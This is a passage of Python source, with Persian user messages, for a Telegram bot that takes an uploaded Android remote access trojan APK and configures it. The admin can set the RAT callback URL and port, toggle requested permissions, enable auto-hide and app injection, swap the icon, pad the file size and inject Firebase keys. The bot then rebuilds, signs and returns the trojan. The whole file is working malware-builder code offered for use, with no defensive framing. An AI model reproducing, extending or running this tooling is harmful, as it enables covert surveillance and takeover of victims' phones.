            NAME[uid] = "rat.apk"
        if os.path.exists(apk):
            os.remove(apk)
        await ev.respond("دارم میگیرم")
        await ev.download_media(file=apk)
        if not os.path.exists(apk):
            await ev.respond("فایل ذخیره نشد دوباره بفرست")
            return
        SRC[uid] = apk
        try:
            c, pkg = await asyncio.get_running_loop().run_in_executor(None, load, apk)
        except Exception as e:
            await ev.respond("خوندنش نشد\n" + str(e))
            return
        CFG[uid] = c
        PKG[uid] = pkg
        STATE[uid] = None
        await ev.respond("خب رسید\nاینم وضعیتش")
        await show(uid)
        return
    if ev.photo is not None and STATE.get(uid) == ("icon", None):
        p = os.path.join(WORK, str(uid), "icon.png")
        await ev.download_media(file=p)
        if os.path.exists(p):
            CFG[uid]["icon"] = p
            STATE[uid] = None
            await ev.respond("ایکون ست شد")
            await show(uid)
        return
    st = STATE.get(uid)
    if isinstance(st, tuple) and st[0] == "edit":
        v = (ev.text or "").strip()
        if not v:
            await ev.respond("خالی بود دوباره بفرست")
            return
        f = st[1]
        c = CFG[uid]
        try:
            if f == "rat_url":
                c["rat_url"] = link_dorost(v)
            elif f == "port":
                c["port"] = v
            elif f == "webview":
                c["webview"] = v
            elif f == "placeholder":
                c["placeholder_sizemb"] = float(v)
            elif f == "off_mod":
                c["off_mod"]["off_mod"] = v
            elif f == "slot":
                c["off_mod"]["slot"] = int(v)
            elif f.startswith("fb:"):
                k = f[3:]
                if k not in FV and k not in ("google_crash_reporting_api_key", "firebase_database_url"):
                    raise ValueError("key")
                c.setdefault("firebase", {})[k] = v
                c["fb_changed"] = True
        except Exception:
            await ev.respond("مقدار درست نیست دوباره بفرست")
            return
        STATE[uid] = None
        await ev.respond("اوکی شد")
        await show(uid)
        return
    await ev.respond("رت رو بفرست")

async def on_cb(ev):
    uid = ev.sender_id
    if uid != ADMIN_ID or uid not in CFG:
        await ev.answer()
        return
    d = ev.data.decode()
    await ev.answer()
    if d == "m:main":
        try:
            await ev.edit(status_text(uid), buttons=main_kb())
        except Exception:
            pass
        return
    if d == "m:perm":
        try:
            await ev.edit("دسترسی ها رو تنظیم کن", buttons=perm_kb(uid))
        except Exception:
            pass
        return
    if d == "m:more":
        try:
            await ev.edit("تنظیمات بیشتر", buttons=more_kb(uid))
        except Exception:
            pass
        return
    if d == "m:fb":
        try:
            await ev.edit("فایربیس\nروی هر مقدار بزنی میتونی عوضش کنی\nیا از فایل google-services.json وارد کن", buttons=firebase_kb(uid))
        except Exception:
            pass
        return
    if d == "f:json":
        STATE[uid] = ("fbjson", None)
        await client.send_message(uid, "فایل google-services.json رو بفرست")
        return
    if d.startswith("f:"):
        k = d[2:]
        STATE[uid] = ("edit", "fb:" + k)
        await client.send_message(uid, "مقدار جدید " + FVN.get(k, k) + " رو بفرست")
        return
    if d.startswith("p:"):
        k = d[2:]
        p = CFG[uid]["permissions"]
        p[k] = "off" if p.get(k) == "on" else "on"
        try:
            await ev.edit("دسترسی ها رو تنظیم کن", buttons=perm_kb(uid))
        except Exception:
            pass
        return
    if d in ("t:auto_hide", "t:app_injection"):
        k = d[2:]
        CFG[uid][k] = "off" if CFG[uid].get(k) == "on" else "on"
        try:
            await ev.edit("تنظیمات بیشتر", buttons=more_kb(uid))
        except Exception:
            pass
        return
    if d.startswith("e:"):
        f = d[2:]
        if f == "icon":
            STATE[uid] = ("icon", None)
            await client.send_message(uid, "عکس ایکون رو بفرست")
            return
        STATE[uid] = ("edit", f)
        t = {"rat_url": "لینک رت", "port": "پورت", "webview": "وب ویو", "off_mod": "اف مود", "slot": "اسلات", "placeholder": "حجم پلیس هولدر"}.get(f, f)
        await client.send_message(uid, "مقدار جدید " + t + " رو بفرست")
        return
    if d == "go":
        if STATE.get(uid) == "busy":
            return
        STATE[uid] = "busy"
        await client.send_message(uid, "دارم میسازم صبر کن")
        try:
            out, ok, chk = await asyncio.get_running_loop().run_in_executor(None, build, uid)
        except Exception as e:
            STATE[uid] = None
            tb = "\n".join(traceback.format_exc().strip().splitlines()[-4:])
            await client.send_message(uid, "خراب شد\n" + str(e) + "\n\n" + tb)
            return
        STATE[uid] = None
        size = round(os.path.getsize(out) / 1048576, 1)
        msg = "ساخته شد\nرت داخلش " + chk + "\nامضا " + ("درسته" if ok else "خرابه") + "\nحجم " + str(size) + " مگ"
        rb = CFG[uid].get("fb_readback") or {}
        if CFG[uid].get("fb_changed") and rb:
            msg += "\n\nفایربیس داخل apk"
            for k in FV:
                if rb.get(k):
                    msg += "\n" + FVN[k] + " " + str(rb[k])
        await client.send_message(uid, msg)
        await client.send_file(uid, out, force_document=True, file_name=os.path.basename(out))
        return

async def boot():
    global client
    gh = need_tools()
    if gh:
        print("این ابزار ها نیستن " + " ".join(gh))
        return
    client = make_client()
    client.add_event_handler(on_msg, events.NewMessage(incoming=True))
    client.add_event_handler(on_cb, events.CallbackQuery())
    await client.start(bot_token=BOT_TOKEN)
    me = await client.get_me()
    print("ربات روشنه " + str(me.username))
    try:
        await client.run_until_disconnected()
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass

if __name__ == "__main__":
    try:
        asyncio.run(boot())
    except KeyboardInterrupt:
        print("خاموش شد")
